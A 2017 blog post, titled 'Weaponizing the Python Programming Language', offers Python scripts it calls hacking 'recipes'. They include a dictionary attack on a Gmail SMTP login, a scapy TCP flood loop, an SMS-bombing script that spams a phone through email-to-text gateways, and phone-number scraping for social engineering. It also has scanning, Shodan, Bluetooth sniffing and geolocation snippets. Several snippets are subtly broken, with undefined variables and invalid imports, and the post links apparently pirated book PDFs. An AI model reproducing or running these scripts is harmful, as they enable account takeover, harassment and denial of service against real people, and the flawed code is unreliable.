---
title: Python for Security
date: 2017-04-08 00:00:00 Z
subtitle: Weaponizing the Python Programming Language
layout: post
comments: true
author: Alan
---

Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is __beginner-friendly__ and __fast to deploy__. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.

    for i in range(0, 50):
      print "Hello"

Without a doubt, Python has that pseudocode feel that gives it the edge of being an _ideal_ language for the greenhorn. But still, with the vast variety of libraries, modules and frameworks available for the language, the use of Python is also incredibly __expansive__. In this article, we are going to implement Python for the intent of penetration testing.

Take __Black Hat Python__ for example. Great book. Ever wanted to build a quick TCP server? Simple. Implement `socket`. Make an object, connect, send some header data, and await a response. Working with networking and TCP/IP has never been easier.


    host = "www.test.com"
    port = 80
    obj = socket(socket.AF_INET, socket.SOCK_STREAM)
    obj.send("GET / HTTP/1.1\r\nHost:" + host + "\r\n\r\n")
    response = obj.recv(4096)
    print response

The point is, with an ever growing collection of Python libraries and easy to deploy code, Python is ideal for the modern hacker. If you ever look at some of the source code for popular pentesting tools, you will see a large
amount of Python.

Well, today I'm more of here to talk to about some applicable code you can use in pentesting situations, where you may not always have access to a Kali machine. And maybe with some ingenuity, you can even execute
this code on a mobile device. So here are my favorite Pythonic recipes.

## 1. Extract Phone Numbers
Let's start off with something simple. Say we want to siphon some Phone Numbers from a document or some sort of webpage. We want to social engineer these numbers, but the page is just spewing a ton of bullshit we don't care much for.

    import re, urllib
    url = "www.test.com/contact.html"
    htmlFile = urllib.urlopen(url)
  	html = htmlFile.read()
    phoneNums = re.findall(r'^(\+\d{1,2}\s)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}$', html)
    print phoneNums

The core component that you need to understand is 5th line, where you would see a random string. What is it?
That is known as a __regular expression__. This is basically a special string that signifies a specific
pattern to look for. That specific regex specified looks for standard phone-numbers in these formats:

    ###-###-####
    (###) ###-####
    ### ### ####
    ###.###.####

[(source for regex)](http://stackoverflow.com/questions/16699007/regular-expression-to-match-standard-10-digit-phone-number)

## 2. Hacking SMTP (email)

With the vast collection of modules for Python, there obviously is one for __SMTP__, also known as ___Simple
Mail Transfer Protocol___. This is the protocol utilized by email services. Let's make a simple script that launches a dictionary attack on a sample Gmail account (can be utilized on other SMTP services, such as Yahoo).

    import smtplib
    username = "hackme@gmail.com"
    # Specify a wordlist
    wordlist = open("wordlist.txt", 'r')
    for i in wordlist.readlines():
          password = i.strip("\n")
          try:
              s = smtplib.SMTP("smtp.gmail.com", 587)
              s.ehlo() # identify self to server to confirm working
              s.starttls() # start secure connect
              s.ehlo
              s.login(username, str(password))
              print "Found! Password: %s" % password
              s.close
            except:
              print "OOPs something went wrong"

Let's look at a few lines. the `for` keyword takes each newline within the `wordlist.txt` and appends it as a possible password. When we look at line 8, a SMTP object is defined, connecting to the Gmail SMTP server on port 587. The SMTP object would attempt to login using with the username, and each password from within the wordlist.

## 3. TCP DoS attack
This quick script provides a way for the user to employ a quick stress.

    from scapy import *
    target = "127.0.0.1" # replace with target IP address
    port = 80
    sport = 8080 # replace with source port, or import random to randomize.
    while True:
      send(IP(dst=target) / TCP(sport=x,dport=port), inter=.005)
      print "Sent. Kill with Ctrl + C"

We look at line 6. This implements the module `scapy`. Three variables are utilized, a target address, port,
and source port. The send() method identifies that, as well as using the TCP protocol.

## 4. Searching Vulnerability with Shodan
This script implements the `shodan` API in order to find vulnerable devices/services.

    import shodan
    SHODAN_API_KEY = # key here
    # Create object
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        results = api.search("") # string to search
        print "Result: %s" % results[total]
        for result in results['matches']:
            print "IP: %s" % result['ip_str']
            print result['data']
    except shodan.APIError, e:
        print "Something went wrong"

## 5. Scanning with Nmap
Very simple host scan using the `python-nmap` module.

    import python-nmap
    ip = '127.0.0.1' # replace with target host
    scan = nmap.PortScanner()
    scan.scan(ip, '0-65535') # scan host, all ports

## 6. Sniffing Bluetooth Devices

    from bluetooth import *
    from time import *
    found = []
    def findDevices():
        foundDevs = discover_devices(lookup_names = True)
        for (addr. name) in foundDevs:
            if addr not in alreadyFound:
                print "Found Device " + str(name)
                print "MAC Address: " + str(addr)
                found.append(addr)
    while True:
        findDevices()
        sleep(5)

## 7. SMS Bomb
This script uses the `smtplib`, just as the SMTP cracker does. However,
this time it is implemented on email-2-text carrier address.

    import smtplib
    # It is important to use a disposable Gmail account
    gmail = "test@gmail"
    password = "somepassword"
    target_num = "123-456-7890@vtext.com"
    # Example Verizon SMS address. Replace with carrier address of num.
    o = smtplib.SMTP("smtp.gmail.com:587")
    o.starttls()
    o.login(gmail, password)
    message = "Something hi"
    spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(gmail, phone_num, message)
    counter = 20 # execute 20 times
    for i in range(counter):
          o.sendmail(gmail, phone_num, spam_msg)

## 8. Geolocation
Take an IP address, and you get back some nice juicy information about geolocation.

    import pygeoip
    # GeoIP object
    gi = pygeoip.GeoIP('GeoIP.dat') # specify database file for GeoIP.
    gi = pygeoip.GeoIP('GeoIPRegion.dat') # region
    gi = pygeoip.GeoIP('GeoIPCity.dat') # city
    gi = pygeoip.GeoIP('GeoIPISP.dat') # ISP
    ip = "127.0.0.1" # replace with IP address!
    # Country
    gi.country_name_by_addr(ip) #=> "United States" for e.g
    gi.region_by_addr(ip) #=> {'region_name': 'NY', 'country_code': 'US'}
    gi.record_by_addr(ip) #=> Returns a huge dict of stuff Im not even gonna give an example
    gi.org_by_addr(ip) #=> "Super Techcom ISP Inc. Corp."
    # More info: https://github.com/appliedsec/pygeoip/wiki
    # Even more info: http://pygeoip.readthedocs.io/en/v0.3.2/getting-started.html

  That's just some of my favorite quick delicious recipes for evil malicious Pythonic hax3z.

  As a language that includes elements of a __procedural scripting__ language and __object-oriented__ language, Python provides at-ease use for both hackers and engineers. I rely greatly on Python when it comes to writing scripts and projects, and hopefully, I'll continue to utilize it. However, to add some variation, I'll start with some projects in C, Rust and Ruby as well. Exploitation is looking nice, so that's something I'm aiming at.

  Thanks for reading, and more is coming! Here is a gr8 list of books by hackers for hackers with relevance to Python:

  * [__Black Hat Python__](http://file.allitebooks.com/20150521/Black%20Hat%20Python.pdf)
  * [__Gray Hat Python__](http://www.chinastor.org/upload/2015-08/15081917086229.pdf)
  * [__Violent Python__](https://repo.zenk-security.com/Programmation/Violent%20Python%20a%20Cookbook%20for%20Hackers-Forensic%20Analysts-Penetration%20testers%20and%20Security%20Engineers.pdf)
 * and of course, if you are a beginner YEARNING to learn, here's a great classic:
 [__Automate the Boring Stuff with Python__](https://automatetheboringstuff.com/)
